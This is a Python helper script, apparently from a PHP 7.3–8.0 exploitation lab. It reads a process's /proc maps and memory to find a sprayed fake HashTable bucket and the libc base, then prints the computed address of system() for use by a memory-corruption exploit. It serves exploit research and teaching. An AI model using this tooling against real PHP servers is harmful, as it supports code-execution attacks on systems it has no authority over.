#!/usr/bin/env python3
"""Recover measured raw-key lab addresses from local /proc.

This is out-of-band local instrumentation.  It is deliberately separate from
the HTTP client and does not constitute a network disclosure or ASLR bypass.
The measured allocation geometry is shared by the exact PHP 7.3.33, 7.4.33,
and 8.0.30 profiles bundled with this lab.
"""

from __future__ import annotations

import argparse
import os
import re
import struct
from dataclasses import dataclass


CONTROL_BUCKET = struct.pack("<QIIQQ", 0, 4, 0, 0x1337, 0)
NEEDLE = CONTROL_BUCKET + b"D" * 48


@dataclass(frozen=True)
class Mapping:
    start: int
    end: int
    perms: str
    offset: int
    path: str


def parse_maps(pid: int) -> list[Mapping]:
    result: list[Mapping] = []
    pattern = re.compile(
        r"^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+([0-9a-f]+)\s+"
        r"\S+\s+\S+\s*(.*)$"
    )
    with open(f"/proc/{pid}/maps", encoding="ascii") as stream:
        for line in stream:
            match = pattern.match(line.rstrip("\n"))
            if match:
                result.append(
                    Mapping(
                        start=int(match.group(1), 16),
                        end=int(match.group(2), 16),
                        perms=match.group(3),
                        offset=int(match.group(4), 16),
                        path=match.group(5),
                    )
                )
    return result


def read_span(mem_fd: int, start: int, size: int) -> bytes:
    try:
        return os.pread(mem_fd, size, start)
    except OSError:
        return b""


def find_reused_hash_table(pid: int, mappings: list[Mapping]) -> tuple[int, int]:
    candidates: list[tuple[int, int]] = []
    mem_fd = os.open(f"/proc/{pid}/mem", os.O_RDONLY)
    try:
        for mapping in mappings:
            if not mapping.perms.startswith("rw-p"):
                continue
            if mapping.path and mapping.path != "[heap]":
                continue
            cursor = mapping.start
            carry = b""
            overlap = len(NEEDLE) - 1
            while cursor < mapping.end:
                size = min(1 << 20, mapping.end - cursor)
                data = read_span(mem_fd, cursor, size)
                if not data:
                    break
                joined = carry + data
                search_from = 0
                while True:
                    hit = joined.find(NEEDLE, search_from)
                    if hit < 0:
                        break
                    address = cursor - len(carry) + hit
                    invalid_index_area = read_span(mem_fd, address - 64, 64)
                    candidates.append((invalid_index_area.count(0xFF), address))
                    search_from = hit + 1
                carry = joined[-overlap:]
                cursor += len(data)
    finally:
        os.close(mem_fd)

    strong = sorted((item for item in candidates if item[0] >= 48), reverse=True)
    if len(strong) != 1:
        rendered = ", ".join(
            f"0x{address:x}/ff={score}" for score, address in strong
        )
        raise RuntimeError(
            f"expected exactly one measured HashTable block; got {len(strong)}: "
            f"{rendered}"
        )
    score, ar_data = strong[0]
    return ar_data, score


def find_libc_bias(mappings: list[Mapping]) -> tuple[int, str]:
    libc = [
        mapping
        for mapping in mappings
        if os.path.basename(mapping.path).startswith(("libc-", "libc.so"))
    ]
    paths = {mapping.path for mapping in libc}
    zero_offset = [mapping for mapping in libc if mapping.offset == 0]
    if len(paths) != 1 or len(zero_offset) != 1:
        raise RuntimeError("expected one libc with one offset-zero mapping")
    return zero_offset[0].start, paths.pop()


def address(value: str) -> int:
    parsed = int(value, 0)
    if parsed <= 0 or parsed >= 1 << 64:
        raise argparse.ArgumentTypeError("value is outside the 64-bit range")
    return parsed


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--pid", required=True, type=int)
    parser.add_argument("--system-symbol", required=True, type=address)
    args = parser.parse_args()
    if args.pid <= 1:
        raise SystemExit("refusing invalid process ID")

    mappings = parse_maps(args.pid)
    ar_data, score = find_reused_hash_table(args.pid, mappings)
    libc_bias, libc_path = find_libc_bias(mappings)
    system = libc_bias + args.system_symbol

    print(f"PROC_ARDATA=0x{ar_data:x}")
    print(f"PROC_ARDATA_FF_SCORE={score}/64")
    print(f"PROC_LIBC_PATH={libc_path}")
    print(f"PROC_LIBC_BIAS=0x{libc_bias:x}")
    print(f"PROC_SYSTEM_SYMBOL=0x{args.system_symbol:x}")
    print(f"PROC_SYSTEM=0x{system:x}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
